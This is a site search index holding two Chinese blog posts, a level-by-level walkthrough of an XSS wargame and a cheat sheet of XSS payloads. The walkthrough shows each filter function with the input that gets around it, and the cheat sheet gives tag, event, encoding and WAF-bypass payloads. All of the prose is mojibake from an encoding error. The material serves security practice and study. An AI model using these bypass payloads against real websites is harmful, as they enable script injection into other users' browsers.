<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Wargame-XSS-game]]></title>
    <url>%2F2018%2F08%2F03%2FWargame-alert(1)-haozi%2F</url>
    <content type="text"><![CDATA[Wargame XSS-alert(1)0x00 æ²¡æœ‰ä»»ä½•è¿‡æ»¤server codefunction render (input) { return &apos;&lt;div&gt;&apos; + input + &apos;&lt;/div&gt;&apos; } åˆ†æžå¯¹è¾“å…¥ inputæ²¡æœ‰åšä»»ä½•çš„è¿‡æ»¤ï¼Œç›´æŽ¥åœ¨divæ ‡ç­¾ä¹‹é—´è¾“å‡ºäº† input code&lt;script&gt;alert(1)&lt;/script&gt; 0x01 textareaæ ‡ç­¾server codefunction render (input) { return &apos;&lt;textarea&gt;&apos; + input + &apos;&lt;/textarea&gt;&apos; } åˆ†æžå¯¹äºŽè¾“å‡ºinputæ²¡æœ‰åšä»»ä½•çš„è¿‡æ»¤ï¼Œå°†inputè¾“å‡ºåœ¨äº† textareaæ ‡ç­¾é‡Œ,ä½¿ç”¨â€â€œé—­åˆå‰é¢çš„æ ‡ç­¾å³å¯ Input code&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;textarea&gt; 0x02 inputæ ‡ç­¾server codefunction render (input) { return &apos;&lt;input type=&quot;name&quot; value=&quot;&apos; + input + &apos;&quot;&gt;&apos; } åˆ†æžè¿™é‡Œè¿”å›žäº†ä¸€ä¸ªinputæ ‡ç­¾ï¼Œåªéœ€è¦é—­åˆå‰é¢çš„åŒå¼•å·å’Œå°–æ‹¬å·å³å¯ â€œ&gt;æˆ–è€…æ˜¯åœ¨inputæ ‡ç­¾é‡Œä½¿ç”¨onfocusäº‹ä»¶ï¼ŒåŠ ä¸Šautofocusè‡ªåŠ¨æ‰§è¡Œï¼Œæ— éœ€äº¤äº’ Input code1&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt; 1&quot; onfocus=javascript:alert(1) autofocus&gt; 0x03 è¿‡æ»¤åœ†æ‹¬å·å’Œæ–¹æ‹¬å·server codefunction render (input) { const stripBracketsRe = /[()]/g input = input.replace(stripBracketsRe, &apos;&apos;) return input } åˆ†æžä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼å…¨å±€åŒ¹é…å°†[]å’Œ()æ›¿æ¢æˆç©ºå­—ç¬¦ Input code1ã€ä½¿ç”¨ åæ’‡å· ` ä»£æ›¿åœ†æ‹¬å· &lt;img src=0 onerror=&quot;alert`1`&quot;&gt; 2ã€å°†åœ†æ‹¬å·è¿›è¡Œhtmlå®žä½“ç¼–ç  &lt;img src=1 onerror=alert&amp;#40;1&amp;#41;&gt; &lt;img src=1 onerror=alert&amp;#x28;1&amp;#x29&gt; &lt;img src=1 onerror=alert&amp;lpar;1&amp;rpar;&gt; 0x04 è¿‡æ»¤æ–¹æ‹¬å·ã€åœ†æ‹¬å·ã€åæ’‡å·server codefunction render (input) { const stripBracketsRe = /[()`]/g input = input.replace(stripBracketsRe, &apos;&apos;) return input } åˆ†æžè¿‡æ»¤äº†æ–¹æ‹¬å·ã€åœ†æ‹¬å·ã€åæ’‡å· Input codeä½¿ç”¨HTMLå®žä½“ç¼–ç ç»•è¿‡ &lt;img src=1 onerror=alert&amp;#40;1&amp;#41;&gt; &lt;img src=1 onerror=alert&amp;#x28;1&amp;#x29&gt; &lt;img src=1 onerror=alert&amp;lpar;1&amp;rpar;&gt; &lt;svg&gt;&lt;script&gt;alert&amp;#40;1&amp;#41&lt;/script 0x05 ç»•è¿‡æ³¨é‡Šç¬¦server codefunction render (input) { input = input.replace(/--&gt;/g, &apos;ðŸ˜‚&apos;) return &apos;&lt;!-- &apos; + input + &apos; --&gt;&apos; } åˆ†æžå…¨å±€è¿‡æ»¤äº†- å’Œ &gt; é˜²æ­¢æˆ‘ä»¬é—­åˆæ³¨é‡Š ä½¿ç”¨â€“!&gt;ç»•è¿‡å¹¶è·³å‡ºæ³¨é‡Šï¼› htmlæ³¨é‡Šï¼šæˆ–è€… Input code--!&gt;&lt;script&gt;alert(1)&lt;/script&gt; 0x06 æ¢è¡Œç»•è¿‡server codefunction render (input) { input = input.replace(/auto|on.*=|&gt;/ig, &apos;_&apos;) return `&lt;input value=1 ${input} type=&quot;text&quot;&gt;` } åˆ†æžå…¨å±€åŒ¹é…æ— è®ºå¤§å°å†™ä»¥autoå¼€å¤´æˆ–è€…onå¼€å¤´=ç»“å°¾çš„å­—ç¬¦ä¸²ï¼Œå°†å…¶æ›¿æ¢æˆ_è€Œä¸”å¯ä»¥çœ‹åˆ°è¾“å‡ºç‚¹é™åˆ¶åœ¨äº†inputæ ‡ç­¾å†… Input codetype=image src onerror =alert(1) 2ã€ä½¿ç”¨æ¢è¡Œç¬¦ç»•è¿‡æ­£åˆ™åŒ¹é… onclick = alert(1) 0x07server codefunction render (input) { const stripTagsRe = /&lt;\/?[^&gt;]+&gt;/gi input = input.replace(stripTagsRe, &apos;&apos;) return `&lt;article&gt;${input}&lt;/article&gt;` } åˆ†æžåŒ¹é…ä»¥ &lt;å¼€å¤´ &gt; ç»“å°¾çš„å­—ç¬¦ä¸²\/? åŒ¹é… / é›¶æ¬¡æˆ–ä¸€æ¬¡[^&gt;] è¯¥è¡¨è¾¾å¼åŒ¹é…é™¤ &gt; ä¹‹å¤–çš„å…¶ä»–å­—ç¬¦ Input codeåˆ©ç”¨æµè§ˆå™¨å®¹é”™æ€§ï¼ŒåŽ»æŽ‰&gt;é—­åˆç»•è¿‡ï¼›æœ€åŽåŠ ä¸ªç©ºæ ¼æˆ–è€…å›žè½¦ &lt;svg/onload=&apos;alert(1)&apos; &lt;img src=x onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;1&amp;#41; &lt;svg/onload=alert(1) 0x08server codefunction render (src) { src = src.replace(/&lt;\/style&gt;/ig, &apos;/* \u574F\u4EBA */&apos;) return ` &lt;style&gt; ${src} &lt;/style&gt; ` } åˆ†æžå°†&lt;/style&gt;æ›¿æ¢æŽ‰ åœ¨&gt;å‰é¢åŠ ä¸ªç©ºæ ¼ç»•è¿‡ &lt;/style &gt; Input code1ã€åœ¨æ ‡ç­¾&gt;é—­åˆå‰åŠ ç©ºæ ¼ç»•è¿‡ï¼› &lt;/style &gt;&lt;script&gt;alert(1)&lt;/script&gt; 2ã€åœ¨æ ‡ç­¾&gt;é—­åˆå‰æ¢è¡Œç»•è¿‡ï¼› &lt;/style &gt;&lt;script&gt;alert(1)&lt;/script&gt; 0x09server codefunction render (input) { let domainRe = /^https?:\/\/www\.segmentfault\.com/ if (domainRe.test(input)) { return `&lt;script src=&quot;${input}&quot;&gt;&lt;/script&gt;` } return &apos;Invalid URL&apos; } åˆ†æžéªŒè¯urlæ˜¯ä¸æ˜¯ https://www.segmentfault.comå¯ä»¥æŽ¥ç€åœ¨åŽé¢é—­åˆæž„é€ æˆ–è€…åœ¨æž„é€ ç¬¦åˆè¦æ±‚çš„urlåŽ»è°ƒç”¨ æ­£åˆ™åŒ¹é…ä»¥https://www.segmentfault.comå¼€å¤´çš„è¾“å…¥ï¼Œè‹¥æ— åŒ¹é…è¿”å›žå¤±è´¥ï¼› input codeé—­åˆå‰é¢çš„ script https://www.segmentfault.com&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;&quot; æˆ–è€…æž„é€ urlè°ƒç”¨è‡ªå·±çš„jsä»£ç  https://www.segmentfault.com.xxxxx.xxxx/xss.js 0x0Aserver codefunction render (input) { function escapeHtml(s) { return s.replace(/&amp;/g, &apos;&amp;amp;&apos;) .replace(/&apos;/g, &apos;&amp;#39;&apos;) .replace(/&quot;/g, &apos;&amp;quot;&apos;) .replace(/&lt;/g, &apos;&amp;lt;&apos;) .replace(/&gt;/g, &apos;&amp;gt;&apos;) .replace(/\//g, &apos;&amp;#x2f&apos;) } const domainRe = /^https?:\/\/www\.segmentfault\.com/ if (domainRe.test(input)) { return `&lt;script src=&quot;${escapeHtml(input)}&quot;&gt;&lt;/script&gt;` } return &apos;Invalid URL&apos; } åˆ†æžå°† &amp; â€˜ â€œ &lt; &gt; / å…¨å±€æ›¿æ¢ä¸ºå®žä½“å­—ç¬¦ä½†æ˜¯å¯ä»¥ä½¿ç”¨ä»¥https://www.segmentfault.comå¼€å¤´çš„urlé“¾æŽ¥åŽ»è°ƒç”¨js Input codehttps://www.segmentfault.com.af/alert.js 0x0Bserver codefunction render (input) { input = input.toUpperCase() return `&lt;h1&gt;${input}&lt;/h1&gt;` } åˆ†æžå°†è¾“å…¥çš„æ‰€æœ‰å­—ç¬¦éƒ½è½¬æ¢ä¸ºå¤§å†™å¤§å†™çš„ALERTä¸æ˜¯æœ‰æ•ˆçš„JavaScriptå‡½æ•°ï¼Œç”¨ç¼–ç ç»•è¿‡å°å†™åˆ°å¤§å†™çš„æ›¿æ¢å³å¯ Input code&lt;img src=0 onerror=&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&gt; &lt;svg&gt;&lt;img src=0 onerror=&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&gt; &lt;svg&gt;&lt;script&gt;&lt;img src=0 onerror=&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&gt;&lt;/script&gt; 0x0Cserver codefunction render (input) { input = input.replace(/script/ig, &apos;&apos;) input = input.toUpperCase() return &apos;&lt;h1&gt;&apos; + input + &apos;&lt;/h1&gt;&apos; } åˆ†æžå…¨å±€åŒ¹é…ä¸èƒ½ä½¿ç”¨script Input code&lt;img src=0 onerror=&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&gt; 0x0Dserver codefunction render (input) { input = input.replace(/[&lt;/&quot;&apos;]/g, &apos;&apos;) return ` &lt;script&gt; // alert(&apos;${input}&apos;) &lt;/script&gt; ` } åˆ†æžæ­£åˆ™åŒ¹é…è¿‡æ»¤ &lt;/â€œâ€˜ æ›¿æ¢ä¸ºç©ºå­—ç¬¦ï¼Œè¾“å‡ºæ˜¯åœ¨//æ³¨é‡ŠåŽé¢ è¾“å‡ºç‚¹ç›´æŽ¥æ˜¯åœ¨scriptæ ‡ç­¾å†…ï¼Œé€šè¿‡æ¢è¡Œç»•è¿‡//æ³¨é‡Šç”±äºŽè¿‡æ»¤äº† / ï¼Œ//å’Œ/**/æ³¨é‡Šå¤±æ•ˆï¼Œè¿‡æ»¤äº†â€™ æ— æ³•ä½¿ç”¨ (â€˜ é—­åˆåŽé¢çš„ â€˜)å¯ä½¿ç”¨HTMLçš„â€“&gt;é—­åˆç»•è¿‡ input code1 alert(1) --&gt; 0x0Eserver codefunction render (input) { input = input.replace(/&lt;([a-zA-Z])/g, &apos;&lt;_$1&apos;) input = input.toUpperCase() return &apos;&lt;h1&gt;&apos; + input + &apos;&lt;/h1&gt;&apos; } åˆ†æžæ­£åˆ™åŒ¹é…ä»¥&lt;å¼€å¤´ï¼ŒåŽé¢æŽ¥è‹±æ–‡å­—æ¯å¤§å°å†™å­—ç¬¦ å³ &lt;+å­—æ¯ çš„æ›¿æ¢æŽ‰ æŸ¥èµ„æ–™å‘çŽ°å­—ç¬¦Å¿å¤§å†™åŽä¸ºSï¼ˆÅ¿ä¸ç­‰äºŽsï¼‰ input&lt;Å¿cript src=0 onerror=&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&gt;&lt;/script&gt; 0x0Fserver codefunction render (input) { function escapeHtml(s) { return s.replace(/&amp;/g, &apos;&amp;amp;&apos;) .replace(/&apos;/g, &apos;&amp;#39;&apos;) .replace(/&quot;/g, &apos;&amp;quot;&apos;) .replace(/&lt;/g, &apos;&amp;lt;&apos;) .replace(/&gt;/g, &apos;&amp;gt;&apos;) .replace(/\//g, &apos;&amp;#x2f;&apos;) } return `&lt;img src onerror=&quot;console.error(&apos;${escapeHtml(input)}&apos;)&quot;&gt;` } åˆ†æžæ­£åˆ™è¡¨è¾¾å¼å°† &amp; â€˜ â€œ &lt; &gt; / è½¬æ¢ä¸ºå®žä½“ç¬¦ console.error()å‘ Web æŽ§åˆ¶å°è¾“å‡ºä¸€æ¡é”™è¯¯æ¶ˆæ¯ã€‚ è™½ç„¶å¯¹å¾ˆå¤šå­—ç¬¦è¿›è¡Œäº†è½¬ä¹‰ï¼Œä½†è½¬ä¹‰çš„ç»“æžœä»åœ¨å¼•å·ä¸­ï¼Œä¼šè¢«å†æ¬¡è§£é‡Šï¼Œæ•…å½“åšæ²¡æœ‰ä»»ä½•è½¬ä¹‰å³å¯ input code&apos;);alert(&apos;1 0x010server codefunction render (input) { return ` &lt;script&gt; window.data = ${input} &lt;/script&gt; ` } åˆ†æžæ²¡æœ‰åšä»»ä½•è¿‡æ»¤ input codealert(1) 0x11server code// from alf.nu function render (s) { function escapeJs (s) { return String(s) .replace(/\\/g, &apos;\\\\&apos;) .replace(/&apos;/g, &apos;\\\&apos;&apos;) .replace(/&quot;/g, &apos;\\&quot;&apos;) .replace(/`/g, &apos;\\`&apos;) .replace(/&lt;/g, &apos;\\74&apos;) .replace(/&gt;/g, &apos;\\76&apos;) .replace(/\//g, &apos;\\/&apos;) .replace(/\n/g, &apos;\\n&apos;) .replace(/\r/g, &apos;\\r&apos;) .replace(/\t/g, &apos;\\t&apos;) .replace(/\f/g, &apos;\\f&apos;) .replace(/\v/g, &apos;\\v&apos;) // .replace(/\b/g, &apos;\\b&apos;) .replace(/\0/g, &apos;\\0&apos;) } s = escapeJs(s) return ` &lt;script&gt; var url = &apos;javascript:console.log(&quot;${s}&quot;)&apos; var a = document.createElement(&apos;a&apos;) a.href = url document.body.appendChild(a) a.click() &lt;/script&gt; ` } åˆ†æžåœ¨ \\ &apos; ` &lt; &gt; \ \n \r \t \f \v å‰é¢åŠ  \ input code&quot;);alert(1)(&quot; 0x12server code// from alf.nu function escape (s) { s = s.replace(/&quot;/g, &apos;\\&quot;&apos;) return &apos;&lt;script&gt;console.log(&quot;&apos; + s + &apos;&quot;);&lt;/script&gt;&apos; } åˆ†æžæ­£åˆ™è¡¨è¾¾å¼å°†åŒå¼•å·è¿›è¡Œäº†ä½¿ç”¨\è½¬ä¹‰æˆ‘ä»¬å¯ä»¥åœ¨åŠ ä¸€ä¸ª\å°†\å†è½¬ä¹‰ä¸€æ¬¡ input code\&quot;);alert(1);// å‚è€ƒPayloadsAllTheThings XSSæ’å…¥ç»•è¿‡ä¸€äº›æ–¹å¼æ€»ç»“ å¯ä»¥è¢«XSSåˆ©ç”¨çš„HTMLæ ‡ç­¾å’Œä¸€äº›æ‰‹æ®µæŠ€å·§]]></content>
      <tags>
        <tag>practice</tag>
        <tag>XSS</tag>
        <tag>XSS-game</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS Base]]></title>
    <url>%2F2018%2F08%2F03%2FXSS-base%2F</url>
    <content type="text"><![CDATA[XSS Baseèƒ½å¤Ÿæ‰§è¡Œjsçš„æ ‡ç­¾ã€äº‹ä»¶ã€å±žæ€§æ ‡ç­¾&lt;script&gt; &lt;a&gt; &lt;p&gt; &lt;img&gt; &lt;body&gt; &lt;button&gt; &lt;var&gt; &lt;div&gt; &lt;iframe&gt; &lt;object&gt; &lt;input&gt; &lt;select&gt; &lt;textarea&gt; &lt;keygen&gt; &lt;frameset&gt; &lt;embed&gt; &lt;svg&gt; &lt;math&gt; &lt;video&gt; &lt;audio&gt; æ‰€æœ‰çš„eventäº‹ä»¶éƒ½å¯ä»¥æ‰§è¡Œjsonload onunload onchange onchange onsubmit onreset onselect onblur onfocus onabort onkeydown onkeypress onkeyup onclick ondbclick onmouseover onmousemove onmouseout onmouseup onforminput onformchange ondrag ondrop å¯ä»¥æ‰§è¡Œjsçš„å±žæ€§formaction action href xlink:href autofocus src content data xssç»•è¿‡æ–¹å¼è‡ªå®šä¹‰æ ‡ç­¾&lt;M/onclick=&quot;alert(1)&quot;&gt;M / ä»£æ›¿ ç©ºæ ¼åœ¨æ ‡ç­¾å’Œå±žæ€§ä¹‹é—´ä¸ä¸€å®šåªèƒ½å‡ºçŽ°ç©ºæ ¼,ä½¿ç”¨/ä»£æ›¿ç©ºæ ¼ &lt;img/src=x onerror=alert(1)&gt; æœ€çŸ­å­—ç¬¦aæ ‡ç­¾1ã€é€šè¿‡JavaScriptä¼ªé€ åè®®æ¥è°ƒç”¨js &lt;a href=javascript:alert(1)&gt;A 2ã€é€šè¿‡dataåè®®æ¥æ‰§è¡ŒJavaScriptï¼Œè¿›ä¸€æ­¥çš„è¯å¯ä»¥å¯¹payloadè¿›è¡Œç¼–ç ï¼ˆbase64ï¼Œurlencode,hex,demical,htmlå®žä½“ç¼–ç ï¼‰(ä¸è¿›è¡Œç¼–ç ä¹Ÿæ˜¯å¯ä»¥çš„) &lt;a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgzKTwvc2NyaXB0Pg==&gt; //base64è§£ç ä¸º&lt;script&gt;alert(1)&lt;/script&gt; &lt;a href=data:text/html;%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%2829%29%3C%2F%73%63%72%69%70%74%3E&gt;M &lt;a href=j&amp;#x61;v&amp;#97script&amp;#x3A;&amp;#97lert(13)&gt;M &lt;svg&gt;&lt;a xlink:href=&quot;javascript:alert(14)&quot;&gt;&lt;rect width=&quot;1000&quot; height=&quot;1000&quot; fill=&quot;white&quot;/&gt;&lt;/a&gt;&lt;/svg&gt; &lt;math&gt;&lt;a xlink:href=javascript:alert(1)&gt;M å„ç§ç¼–ç ç»•è¿‡ç™¾åˆ†ä¹‹ç™¾åˆ†å·æŠŠ%ç»™urlç¼–ç æˆ%25ï¼Œå¦‚æžœåœ¨åŽå°å¯¹å‚æ•°æœ‰å†æ¬¡è¿›è¡Œurldecodeï¼Œæˆ–è€…è¾“å‡ºæ—¶æœ‰urldecodeé‚£ä¹ˆå°±å¯ä»¥ç»•è¿‡WAFï¼Œ base64ç¼–ç ç»•è¿‡ä¸è¿‡æ»¤&lt;&gt;ä½†è¿‡æ»¤script å’Œäº‹ä»¶æ“ä½œ onxxxxçš„æ—¶å€™ï¼Œä½¿ç”¨base64ç¼–ç æ¥ç»•è¿‡ &lt;iframe src=â€data:text/html;base64,PHNjcmlwdD5hbGVydCgnYmFzZTY0X2lmcmFtZScpPC9zY3JpcHQ+â€&gt; HTMLå®žä½“ç¼–ç çš„åˆ©ç”¨ç»•è¿‡waf&lt;a href= â€˜javascript:alert&amp;#40;&amp;#39;123&amp;#39;&amp;#41; â€˜&gt;Hello&lt;/a&gt; &lt;a href= â€œj&amp;#97;vascript:alert&amp;#40; â€™123â€² &amp;#41;â€œ&gt;Hello&lt;/a &gt; &lt;a href= â€œj&amp;#97;vascript:alert&amp;#0000040; â€™123â€² &amp;#41;â€œ&gt;Hello&lt;/a &gt; &lt;a href= â€œj&amp;#97vascript:alert&amp;#0000040â€™123â€² &amp;#41â€œ&gt;Hello&lt;/a &gt; åœ¨æ ‡ç­¾å†…çš„æ‰€æœ‰ä¼ªåè®®JSä»£ç éƒ½æ˜¯å¯ä»¥ä¸ç”¨åŒå¼•å·åŒ…è£¹çš„ evalå‡½æ•°evalå‡½æ•°è®¤è¯†\xåå…­è¿›åˆ¶\å…«è¿›åˆ¶\uunicodeç ï¼ˆè®°å¾—ä½¿ç”¨å¼•å·ï¼‰ &lt;a href=&quot;j&amp;#97;vascript:eval(&apos;&amp;#97;\x6c\x65\x72\x74\x28\x22\x31\x22\x29&apos;)&quot;&gt;Hello&lt;/a&gt; &lt;a href=&quot;j&amp;#97;vascript:eval(&apos;&amp;#97;\u0091\x65\x72\x74\x28\x22\x31\x22\x29&apos;)&quot;&gt;Hello&lt;/a&gt; &lt;a href=&quot;j&amp;#97;vascript:eval(&apos;&amp;#97;\154\x65\x72\x74\x28\x22\x31\x22\x29&apos;)&quot;&gt;Hello&lt;/a&gt; scriptæ ‡ç­¾1ã€jsfuckç¼–ç  http://www.jsfuck.com/ &lt;script&gt;alert((+[][+[]]+[])[++[[]][+[]]]+([![]]+[])[++[++[[]][+[]]][+[]]]+([!![]]+[])[++[++[++[[]][+[]]][+[]]][+[]]]+([!![]]+[])[++[[]][+[]]]+([!![]]+[])[+[]])&lt;/script&gt; 2ã€ä¸è§„èŒƒçš„scriptæ ‡ç­¾ &lt;script firefox&gt;alert(1)&lt;/script&gt; 3ã€å¯ä»¥ç”¨â€/â€œæ¥ä»£æ›¿å•å¼•å·å’ŒåŒå¼•å· script&gt;alert(/3/)&lt;/script&gt; 4ã€å¦‚æžœè¾“å‡ºæ˜¯åœ¨setTimeouté‡Œï¼Œæˆ‘ä»¬ä¾ç„¶å¯ä»¥ç›´æŽ¥æ‰§è¡Œalert(1) &lt;script&gt;setTimeout(&apos;alert(1)&apos;,0)&lt;/script&gt; 5ã€ä¸åªæ˜¯alertã€‚promptå’Œconfirmä¹Ÿå¯ä»¥å¼¹çª— &lt;script&gt;prompt(-[])&lt;/script&gt; 6ã€å„ç§ç¼–ç æ–¹å¼ &lt;script&gt;alert(String.fromCharCode(49))&lt;/script&gt; buttonæ ‡ç­¾1ã€é€šè¿‡eventäº‹ä»¶æ¥å®žçŽ° &lt;button/onclick=alert(1)&gt;M&lt;/button&gt; 2ã€å¦‚æžœon(event)è¢«è¿‡æ»¤äº† &lt;form&gt;&lt;button formaction=javascript&amp;colon;alert(1)&gt;M åŠ ä¸Šautofocusè‡ªåŠ¨å¼¹çª—ï¼Œæ— éœ€äº¤äº’ &lt;button onfocus=alert(1) autofocus&gt; pæ ‡ç­¾å¦‚æžœå˜é‡è¾“å‡ºåœ¨pæ ‡ç­¾é‡Œï¼Œä¸ä¸€å®šè¦è·³å‡ºæ ‡ç­¾ï¼Œåªè¦è·³å‡ºâ€â€å³å¯ &lt;p/onmouseover=javascript:alert(1);&gt;M&lt;/p&gt; imgæ ‡ç­¾&lt;img src=x onerror=alert(1)&gt; &lt;img src ?itworksonchrome&gt;\/onerror = alert(1)&gt; //åªåœ¨chromeä¸‹æœ‰æ•ˆ &lt;img src=x onerror=window.open(&apos;http://google.com&apos;);&gt; &lt;img/src/onerror=alert(1)&gt; //åªåœ¨chromeä¸‹æœ‰æ•ˆ &lt;img src=&quot;x:test&quot; onerror=&quot;alert(1)&quot;&gt; bodyæ ‡ç­¾é€šè¿‡ä½¿ç”¨eventæ¥è°ƒç”¨ &lt;body onload=alert(1)&gt; &lt;body onscroll=alert(1)&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt; varæ ‡ç­¾&lt;var onmouseover=&quot;prompt(1)&quot;&gt;test&lt;/var&gt; divæ ‡ç­¾&lt;div/onmouseover=&apos;alert(1)&apos;&gt;test &lt;div style=&quot;position:absolute;top:0;left:0;width:100%;height:100%&quot; onclick=&quot;alert(1)&quot;&gt; iframeæ ‡ç­¾metaæ ‡ç­¾è·³å‡ºå½“å‰å±žæ€§åœ¨æ·»åŠ http-equiv=â€refreshâ€ï¼Œæˆ–è€…é€šè¿‡ç»™http-equivè®¾ç½®set-cookieæ¥ï¼Œè¿›ä¸€æ­¥é‡æ–°è®¾ç½®cookie &lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;javascript&amp;colon;alert(1)&quot;/&gt;? &lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;&gt; objectæ ‡ç­¾å’Œaæ ‡ç­¾çš„hrefå±žæ€§çŽ©æ³•æ˜¯ä¸€æ ·çš„ï¼Œä¸è¿‡ä¼˜ç‚¹æ˜¯æ— é¡»äº¤äº’ &lt;object&gt; data=data:text/html;base64,PHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4=&gt;&lt;/object&gt; marqueeæ ‡ç­¾&lt;marquee onstart=&quot;alert(&apos;sometext&apos;)&quot;&gt;&lt;/marquee&gt; isindexæ ‡ç­¾&lt;isindex type=image src=1 onerror=alert(1)&gt; &lt;isindex action=javascript:alert(1) type=image&gt; inputæ ‡ç­¾é€šè¿‡eventæ¥è°ƒç”¨jsã€‚å’Œä¹‹å‰çš„buttonçš„ä¾‹å­ä¸€æ ·é€šè¿‡ autofocusæ¥è¾¾åˆ°æ— é¡»äº¤äº’å³å¯ &lt;input onfocus=javascript:alert(1) autofocus&gt; &lt;input onblur=javascript:alert(1) autofocus&gt;&lt;input autofocus&gt; selectæ ‡ç­¾&lt;select onfocus=javascript:alert(1) autofocus&gt; textareaæ ‡ç­¾&lt;textarea onfocus=javascript:alert(1) autofocus&gt; keygenæ ‡ç­¾&lt;keygen onfocus=javascript:alert(1) autofocus&gt; framesetæ ‡ç­¾&lt;frameset onload=alert(1)&gt; &lt;embedæ ‡ç­¾&gt;&lt;embed src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4=&quot;&gt;&lt;/embed&gt; //chrome &lt;embed src=javascript:alert(1)&gt; //firefox svgæ ‡ç­¾&lt;svg onload=&quot;javascript:alert(1)&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;&lt;/svg&gt; &lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;&lt;g onload=&quot;javascript:alert(1)&quot;&gt;&lt;/g&gt;&lt;/svg&gt; //chromeæœ‰æ•ˆ mathæ ‡ç­¾&lt;math href=&quot;javascript:javascript:alert(1)&quot;&gt;CLICKME&lt;/math&gt; &lt;math&gt;&lt;y/xlink:href=javascript:alert(51)&gt;test1 &lt;math&gt; &lt;maction actiontype=&quot;statusline#http://wangnima.com&quot; xlink:href=&quot;javascript:alert(49)&quot;&gt;CLICKME&lt;/maction&gt; &lt;/math&gt; videoæ ‡ç­¾&lt;video&gt;&lt;source onerror=&quot;alert(1)&quot;&gt; &lt;video src=x onerror=alert(48)&gt; audioæ ‡ç­¾&lt;audio src=x onerror=alert(47)&gt; åœ¨è¿™äº›æ ‡ç­¾é‡Œé¢å‡¡æ˜¯å‡ºçŽ°åœ¨on*äº‹ä»¶å€¼é‡Œé¢çš„javascript:éƒ½æ˜¯å¤šä½™çš„ å¹³æ—¶æžXSSå¯èƒ½ä¼šç”¨å¾—åˆ°çš„æŠ€å·§Refererä¸ºç©ºæ‰å¯ä»¥è®¿é—®æœ‰ä¸€äº›ç•Œé¢ä¸ºäº†é¿å…æ˜¯åˆ«çš„åœ°æ–¹è·³è½¬è¿‡æ¥çš„ Refererå¿…é¡»ä¸ºç©ºï¼Œé‚£ä»€ä¹ˆæƒ…å†µRefererä¸ºç©ºå‘¢ï¼Œç¬¬ä¸€æ˜¯HTTPSåè®®åˆ°HTTPçš„åè®®ï¼Œè¿™æ—¶å€™Refererä¸ºç©ºï¼Œæˆ–è€…ç”¨åµŒå…¥ä¸€ä¸ªiframeç”¨dataåŠ base64ç¼–ç çš„æ–¹å¼ï¼Œè¿˜å¯ä»¥ç”¨&lt;meta name=â€referrerâ€ content=â€neverâ€ &gt;æ¥è¾¾åˆ°refererä¸ºç©º æ³¨æ„è¿”å›žçš„typeç±»åž‹è¿”å›žä»€ä¹ˆæ ·çš„ç±»åž‹å†³å®šäº†æµè§ˆå™¨æ¸²æŸ“è¿˜æ˜¯ä¸æ¸²æŸ“ä½ çš„XSSä»£ç ï¼Œåªæœ‰è¿”å›žçš„æ˜¯XMLæˆ–è€…HTML æ‰æœ‰å¯èƒ½ä¼šæ‰§è¡ŒæˆåŠŸä½ çš„XSSä»£ç ï¼Œä¸è¿‡ä¸åŒæµè§ˆå™¨çš„ç‰¹æ€§ä¸åŒï¼Œæœ‰ä¸€äº›è¿”å›žçš„typeç±»åž‹å¯èƒ½ä¹Ÿæ˜¯å¯ä»¥æ‰§è¡ŒXSSçš„ï¼Œå°¤å…¶æ˜¯ä¸€äº›è€çš„ieæµè§ˆå™¨ï¼Œå…·ä½“å¯ä»¥çœ‹çœ‹freebufä¹‹å‰å‘å¸ƒè¿‡çš„ä¸€ç¯‡å…³äºŽtypeå’Œæµè§ˆå™¨æ‰§è¡Œçš„è¡¨æ ¼ã€‚ é˜»æ­¢æµè§ˆå™¨302è·³è½¬æ€»æ‰€æ€»ä¹‹ï¼Œæµè§ˆå™¨é‡åˆ°302ï¼Œ301ä¼šç›´æŽ¥è·Ÿè¿›å¤´éƒ¨çš„è·³è½¬é“¾æŽ¥ï¼Œå¯æ˜¯æœ‰æ—¶å€™XSSç•Œé¢å°±æ˜¯è¿™ä¸ªè·³è½¬é¡µé¢ï¼Œè¿™ä¸ªè·³è½¬urlæ˜¯å¯æŽ§çš„ï¼Œå¹¶ä¸”åœ¨æµè§ˆå™¨æ˜¾ç¤ºå¦‚æžœæµè§ˆå™¨æ²¡æœ‰æ­£ç¡®è·³è½¬ï¼Œè¯·ç‚¹å‡»XXXçš„å­—æ ·ã€‚é‚£æ€Žä¹ˆæ ·æ‰å¯ä»¥è®©æµè§ˆå™¨ä¸è‡ªåŠ¨è·³è½¬å‘¢ï¼Ÿä¸€ç§å°±æ˜¯æŠŠè·³è½¬çš„urlç«¯å£è®¾ç½®ä½ŽäºŽ80 è­¬å¦‚è¾“å…¥http://xss.com:0â€ onclick=â€alert(/1/) ,è¿˜å¯ä»¥ä½¿ç”¨CSPç­–ç•¥åµŒå…¥ä¸€ä¸ªiframe 